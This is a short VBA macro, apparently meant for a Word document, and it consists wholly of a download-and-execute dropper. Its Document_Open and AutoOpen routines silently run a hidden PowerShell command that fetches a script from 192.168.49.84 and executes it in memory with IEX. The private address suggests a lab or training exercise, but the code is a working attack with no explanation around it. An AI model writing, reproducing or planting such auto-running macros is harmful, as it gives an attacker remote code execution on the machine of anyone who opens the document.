Sub DownExec()
    Dim str as String
    str = "powershell iwr -NoProxy http://192.168.49.84/run1.ps1|IEX"
    Shell str, vbHide
End Sub

Sub Document_Open()
    DownExec
End Sub

Sub AutoOpen()
    DownExec
End Sub
